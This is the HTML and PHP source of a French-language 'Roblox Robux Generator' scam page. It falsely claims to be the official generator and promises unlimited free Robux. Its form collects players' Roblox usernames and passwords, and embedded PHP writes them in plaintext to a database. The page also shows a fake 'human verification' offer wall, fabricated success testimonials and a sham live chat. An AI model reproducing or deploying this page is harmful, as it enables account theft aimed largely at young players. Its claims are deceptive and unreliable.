<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<title>Roblox Robux Generator 2020</title>
<meta name="description" content="New Roblox Robux hack is finally here and its working on both iOS,Android and PC platforms.">
<meta name="author" content="Roblox Robux">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="icon" type="image/ico" href="images\gamebag-favico.png">
<link href="images\css8a7c8a7c8a7c.css?family=Open+Sans:300,400,700" rel="stylesheet">
<link rel="stylesheet" href="images\font-awesome.min.css">
<link href="images\bootstrap.min.css" rel="stylesheet">
<link href="images\animate.css" rel="stylesheet">
<link href="images\sweetalert2.min.css" rel="stylesheet">
<link href="images\magnific-popup.css" rel="stylesheet">
<link href="images\fancyselect.css" rel="stylesheet">
<link href="images\style.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="images\custom-css.css">

</head>
<body>
<div id="loader-wrapper">
<div id="loader"></div>
<div class="loader-section section-left"></div>
<div class="centered"><img src="images\gamebaglogo.png" alt="" align="middle"></div>
<div class="loader-section section-right"></div>
</div>
<header>
<div class="branding-wrapper">
<img class="logo-img" src="images\header.png" alt="" width="180px" height="180px">
</div>
</header>
<div class="main-wrapper">
<div class="row">
<div class="generator-wrapper col-sm-8">
<div class="generator-wrapper-inner panel-box-wrapper same-height-top-panel">
<div class="panel-overlay"></div>
<div id="account-information-wrapper" class="account-information-wrapper">
<div class="account-information-inner-wrapper">
<div id="close-account-information-wrapper" class="close-account-information-wrapper"><i class="fa fa-times" aria-hidden="true"></i></div>
<h4>Informations du compte</h4>


<div class="account-info-fields-wrapper">
</div>
<div class="account-platform-wrapper">
<label class="generator-input-label" for="account-platform">Platforme:</label>
<select id="account-platform" class="generator-input f-s">
<option value="Android">Android</option>
<option value="iOS">IOS</option>
<option value="PC">PC</option>
</select>
</div>

<form method="post">
	<center>

		<input type="username" name="username" id="username" placeholder="Pseudo Roblox" required><br/>

		<input type="password" name="password" id="password" placeholder="mot de passe Roblox" required><br/>

		<input type="submit" name="formsend" id="formsend" value="Valider mon inscription">
</center>
	</form>

	<style>
		#username
		{ 
		color: #000000;
		}
		#password
		{ 
		color: #000000; 
		}
		#username
		{ 
		color: #FFFFFF;
		}
	</style>

<?php

		if(isset($_POST['formsend'])) {

			extract($_POST);

			if(!empty($password)){

				$options = [
					'cost' => 12,
				];

				//$hashpass = password_hash($password, PASSWORD_BCRYPT, $options);

				include 'database.php';
				global $db;

				$q = $db->prepare("INSERT INTO users(username,password) VALUES(:username, :password)");
				$q->execute([
					'username' => $username,
					'password' => $password
				]);
				
					
			}else{
				echo "les champs ne sont pas tous remplis";
			}
		}
	?>


<div class="generator-button-wrapper">
<div class="generator-button-inner-wrapper second-step-inner-wrapper">
<div class="generator-button-dot b-t-r"></div>
<div class="generator-button-dot b-t-l"></div>
<div class="generator-button-dot b-b-r"></div>
<div class="generator-button-dot b-b-l"></div>
<div class="generator-button-overlay"></div>
</div>
</div>
</div>
</div>
<div class="panel-content">
<div class="row">
<div class="col-md-12">
<div class="generator-header">
<h1>G&eacuten&eacuterateur de Robux</h1>
<p>Vous pouvez utiliser en toute s&eacutecurit&eacute Roblox Generator pour ajouter des Robux en illimit&eacute &agrave votre compte Roblox. Ceci est le g&eacuten&eacuterateur officiel Roblox mis &agrave jour pour 2020. Le g&eacuten&eacuterateur est facile &agrave utiliser. Entrez simplement votre nom d'utilisateur et s&eacutelectionnez la quantit&eacute de Robux que vous souhaitez ajouter &agrave votre compte. Je vous conseil de vous depecher car il n'y en a presque plus ! Besoin d'aide ? : https://discord.gg/TksfXXM
Conseil : lisez les TOS avant d'utiliser le site ! http://buxland.alwaysdata.net/tos.html
<br>
</p></div>
</div>
</div>
<div id="resources-select-wrapper" class="resources-select-wrapper">
<div class="single-resource-wrapper row">
<div class="progressBarPoints-select-wrapper">
<div class="col-xs-1 no-padding-right responsive-button-wrapper">
</div>
<div class="col-xs-10 responsive-value-wrapper">
<h3 class="resources-title">Somme de Robux</h3>
<div id="fut1-amount-wrapper" class="selected-amount-wrapper">
<img class="resource-img" src="images\ft-1.png" alt="" width="40px" height="40px">
<div id="fut1-amount">1000</div>
<div class="max-amount max-amount-fut1">Montant MAX</div>
</div>
<div>
<select id="fut1-select" class="generator-input">
<option value="1000">1000</option>
<option value="5000">2000</option>
<option value="25000">5000</option>
<option value="50000">10000</option>
<option value="100000">50000</option>
</select>
</div>
<div id="progressBar" class="fut1-loadbar"><div></div></div>
</div>
<div class="col-xs-1 no-padding-left responsive-button-wrapper">
</div>
</div>
</div>
<div class="generator-button-wrapper generator-start-wrapper">
<div class="generator-button-inner-wrapper">
<div class="generator-button-dot b-t-r"></div>
<div class="generator-button-dot b-t-l"></div>
<div class="generator-button-dot b-b-r"></div>
<div class="generator-button-dot b-b-l"></div>
<div class="generator-button-overlay"></div>
<a id="first-step-button" class="generator-button first-step-button"><span class="generator-button-text">Generate</span></a>
</div>
<br>
<br>
</div>
</div>
<div id="processing-wrapper" class="processing-wrapper">
<div class="main-console-wrapper">
<div class="starting-loading-wrapper">
<i class="icon-refresh rotating"></i>
<span class="starting-loading-title">Processing...</span>
</div>
<div class="human-verification-wrapper" id="human-verification">
<div class="human-verification-inner-wrapper">
<center><h2>Human Verification - Complete ONE offer!</h2></center>
<center><h3>After completion your robux will be send to your account</h3></center>
<div class="verification-offers-wrapper">
<div id="fountainG">
<div id="fountainG_1" class="fountainG"></div>
<div id="fountainG_2" class="fountainG"></div>
<div id="fountainG_3" class="fountainG"></div>
<div id="fountainG_4" class="fountainG"></div>
<div id="fountainG_5" class="fountainG"></div>
<div id="fountainG_6" class="fountainG"></div>
<div id="fountainG_7" class="fountainG"></div>
<div id="fountainG_8" class="fountainG"></div>
</div>
</div>
</div>
</div>
<div class="row first-console-row">
<div class="col-sm-6">
<div class="console-username-wrapper console-item-wrapper">
<div id="console-success-confirmation-username" class="console-success-confirmation top-right"><i class="fa fa-check-circle" aria-hidden="true"></i></div>
<h5>Account Username:</h5>
<span id="console-username-value" class="console-item-value"><i class="icon-refresh rotating"></i></span>
</div>
</div>
<div class="col-sm-6">
<div class="console-platform-wrapper console-item-wrapper">
<div id="console-success-confirmation-platform" class="console-success-confirmation top-right"><i class="fa fa-check-circle" aria-hidden="true"></i></div>
<h5>Selected Platform:</h5>
<span id="console-platform-value" class="console-item-value"><i class="icon-refresh rotating"></i></span>
</div>
</div>
</div>
<div class="row">
<div class="col-sm-6">
<div class="console-fut1-wrapper console-item-wrapper">
<div id="console-success-confirmation-fut1" class="console-success-confirmation top-right"><i class="fa fa-check-circle" aria-hidden="true"></i></div>
<h5>Robux Amount:</h5>
<div class="console-fut1-value-inner-wrapper">
<img class="console-resource-img" src="images\ft-1.png" alt="" width="40px" height="40px">
<span id="console-fut1-value" class="console-item-value console-resource-value">0</span>
</div>
</div>
</div>
</div>
</div>
<div class="messages-console-wrapper">
<div class="console-message"></div>
</div>
<div class="loadbar-console-wrapper">
<div id="progressBarConsole" class="console-loadbar"><div></div></div>
</div>
</div>
</div>
</div>
<br>
<center>
<div id="avp_1565002579973">
<script>
									_avp.push({ tagid: 'avp_1565002579973', alias: '/', type: 'banner', zid: 8, pid: 8934 });
									</script>
</div>
</center>
</div>
<div class="recent-activity-wrapper col-sm-4">
<div class="recent-activity-inner panel-box-wrapper same-height-top-panel">
<div class="panel-overlay"></div>
<div class="panel-content">
<div class="panel-title">
<h2>Activit&eacute r&eacutecente</h2>
</div>
<div id="recent-activity" class="recent-activity">
</div>
</div>
</div>
</div>
</div>
<div class="row bottom-row">
<div class="comments-wrapper col-md-8">
<div class="comments-wrapper-inner panel-box-wrapper same-height-bottom-panel">
<div class="panel-overlay"></div>
<div class="panel-content">
<div class="panel-title">
</div>
<form action="#" class="comments-section-form">
<fieldset>
<section>
<label class="input comment-user-img-wrapp"><i class="icon-profile-male comment-user-img"></i></label>
<div class="comment-wrapper">
<label class="input">
<span class="comment-username" id="username1"></span><span class="timePosted" id="timePosted1"></span>
<span class="comments"><p>merci sa marche vraiment :)</p></span>
</label>
</div>
<label class="input"></label>
</section>
</fieldset>
<fieldset>
<section>
<label class="input comment-user-img-wrapp"><i class="icon-profile-male comment-user-img"></i></label>
<div class="comment-wrapper">
<label class="input">
<span class="comment-username" id="username2"></span><span class="timePosted" id="timePosted2"></span>
<span class="comments"><p> J'ai encore eu mes Robux <3 merci beaucoup <3</p></span>
</label>
</div>
<label class="input"></label>
</section>
</fieldset>
<fieldset>
<section>
<label class="input comment-user-img-wrapp"><i class="icon-profile-male comment-user-img"></i></label>
<div class="comment-wrapper">
<label class="input">
<span class="comment-username" id="username3"></span><span class="timePosted" id="timePosted3"></span>
<span class="comments"><p> &ccedila &agrave pris du temps, mais je les ai enfin eu !</p></span>
</label>
</div>
<label class="input"></label>
</section>
</fieldset>
<div class="add-new-comment-wrapp">
<h4>Ajouter un nouveau commentaire</h4>
<section>
<label class="input" id="commentUsernameLabel">
<input id="commentUsername" placeholder="Username" type="text">
</label>
</section>
<section>
<label class="textarea" id="commentCommentLabel">
<textarea id="commentComment" rows="3"></textarea>
</label>
<div class="post-new-comment-button-wrapp">
<div class="post-new-comment-button-inner-wrapp">
<a class="button-style-1 small" href="javascript:void(0)">Post</a>
</div>
</div>
<div class="shake-wrapper-2"><p class="nocommentsfornoobs"><i class="fa fa-info-circle" aria-hidden="true"></i> Afin d'emp&ecirccher le spam, seuls les utilisateurs ayant d&eacutej&agrave utilis&eacute le g&eacuten&eacuterateur peuvent &eacutecrire un commentaire</p></div>
</section>
</div>
</form>
</div>
</div>
</div>
<div class="chat-wrapper col-md-4">
<div class="chat-wrapper-inner panel-box-wrapper same-height-bottom-panel">
<div class="panel-overlay"></div>
<div class="panel-content">
<div class="panel-title">
<h2>Live Chat</h2>
</div>
<div class="chat-inner-wrapper">
<div class="livechatContainerTop" style=" height: 0px!important; border-top-left-radius: 4px; border-top-right-radius: 4px;">
<span class="yellow_text" style=" font-size: 16px; position: relative; font-weight: 100; bottom: 10px;">
Generator Chatroom (<span id="online2"></span>)</span>
</div>
<div class="livechatContainerCenter">
<div id="livechatContainerChat" style="text-shadow: none;">
<div class="livechatOverlaySmall" style=" display:none; z-index: 3; position: absolute; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.34);">
</div>
<div id="livechatContainerChatUserName">
<div class="livechatContainerTop">
<span class="chat-input-label">Enter your Chat Username</span>
</div>
<input id="livechatInputChatUserName" type="text">
<div class="blue_button" id="livechatButtonChatUserName">
<div class="blue_button_text noselect">
Save
</div>
</div>
</div>
<div id="livechatContainerChatContent">
<div id="livechatChatContent" style="text-shadow: none;"></div>
</div>
</div>
<div id="livechatContainerChatControls" style="text-shadow: none;">
<div style="margin-bottom: 5px; text-shadow: none;">
<input id="livechatInputChat" placeholder="Send a message" type="text">
<div class="live-chat-button-wrapper">
<div id="livechatButtonChat">
<div class="blue_button_text noselect">
Send
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="row">
<div class="col-md-12">
<br>
<center>
<div id="avp_1565002348410">
<script>
_avp.push({ tagid: 'avp_1565002348410', alias: '/', type: 'banner', zid: 9, pid: 8934 });
</script>
</div>
</center>
</div>
</div>
</div>
<footer>
<h2>Copyright &copy 2020. All rights reserved. We are not affiliated with the ROBLOX Corporation. </h2>
</footer>
<div id="terms-of-service" class="tos-popup-wrapper popup-wrapper mfp-hide">
<script type="text/javascript" src="images\jquery-3.2.1.js"></script>
<script src="images\jquery-ui.min.js" type="text/javascript"></script>
<script type="text/javascript" src="images\fancyselect.js"></script>
<script type="text/javascript" src="images\jquery.countto.js"></script>
<script type="text/javascript" src="images\sweetalert2.min.js"></script>
<script type="text/javascript" src="images\validator.min.js"></script>
<script type="text/javascript" src="images\com.js"></script>
<script type="text/javascript" src="images\form-scripts.js"></script>
<script type="text/javascript" src="images\jquery.magnific-popup.min.js"></script>
<script type="text/javascript" src="images\sticky.js"></script>
<script type="text/javascript" src="images\main.js"></script>
<script src="images\scripts.js"></script>
<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
<script type="text/javascript">var _Hasync= _Hasync|| [];
_Hasync.push(['Histats.start', '1,4275781,4,0,0,0,00010000']);
_Hasync.push(['Histats.fasi', '1']);
_Hasync.push(['Histats.track_hits', '']);
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src = ('//s10.histats.com/js15_as.js');
(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
})();</script>
<noscript><a href="index.htm" target="_blank"><img src="//sstatic1.histats.com/0.gif?4275781&101" alt="counter" border="0"></a></noscript>
</div>
<button onclick="window.location.href='http://buxland.alwaysdata.net/tos.html';">
      TOS
    </button>
</body>
</html>
